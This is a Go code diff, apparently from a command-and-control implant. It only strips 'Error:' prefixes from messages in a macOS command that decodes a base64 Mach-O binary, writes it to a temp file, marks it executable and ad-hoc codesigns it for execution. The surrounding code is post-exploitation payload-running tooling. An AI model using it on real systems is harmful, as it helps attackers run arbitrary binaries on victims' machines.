@@ -34,7 +34,7 @@ func (c *ExecuteMemoryCommand) Description() string {
 
 func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		return errorResult("Error: binary_b64 parameter required (base64-encoded Mach-O binary)")
+		return errorResult("binary_b64 parameter required (base64-encoded Mach-O binary)")
 	}
 
 	args, parseErr := unmarshalParams[executeMemoryArgs](task)
@@ -43,20 +43,20 @@ func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult 
 	}
 
 	if args.BinaryB64 == "" {
-		return errorResult("Error: binary_b64 is empty")
+		return errorResult("binary_b64 is empty")
 	}
 
 	binaryData, err := base64.StdEncoding.DecodeString(args.BinaryB64)
 	if err != nil {
-		return errorf("Error decoding binary: %v", err)
+		return errorf("decoding binary: %v", err)
 	}
 
 	if len(binaryData) < 4 {
-		return errorResult("Error: binary data too small to be valid")
+		return errorResult("binary data too small to be valid")
 	}
 
 	if !isValidMachO(binaryData) {
-		return errorResult("Error: not a valid Mach-O binary (unrecognized magic header)")
+		return errorResult("not a valid Mach-O binary (unrecognized magic header)")
 	}
 
 	timeout := args.Timeout
@@ -67,7 +67,7 @@ func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult 
 	// Create temp file — use system temp dir (usually /private/var/folders/.../T/)
 	tmpFile, err := os.CreateTemp("", "")
 	if err != nil {
-		return errorf("Error creating temp file: %v", err)
+		return errorf("creating temp file: %v", err)
 	}
 	tmpPath := tmpFile.Name()
 
@@ -75,14 +75,14 @@ func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult 
 	if _, err := tmpFile.Write(binaryData); err != nil {
 		tmpFile.Close()
 		secureRemove(tmpPath)
-		return errorf("Error writing binary: %v", err)
+		return errorf("writing binary: %v", err)
 	}
 	tmpFile.Close()
 
 	// Make executable
 	if err := os.Chmod(tmpPath, 0700); err != nil {
 		secureRemove(tmpPath)
-		return errorf("Error setting executable permission: %v", err)
+		return errorf("setting executable permission: %v", err)
 	}
 
 	// Ad-hoc codesign only if the binary is unsigned. Pre-signed binaries (e.g., system
@@ -90,7 +90,7 @@ func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult 
 	if _, verifyErr := execCmdTimeout("/usr/bin/codesign", "-v", "--no-strict", tmpPath); verifyErr != nil {
 		if signOut, signErr := execCmdTimeout("/usr/bin/codesign", "-s", "-", tmpPath); signErr != nil {
 			secureRemove(tmpPath)
-			return errorf("Error code signing binary: %v: %s", signErr, string(signOut))
+			return errorf("code signing binary: %v: %s", signErr, string(signOut))
 		}
 	}
 
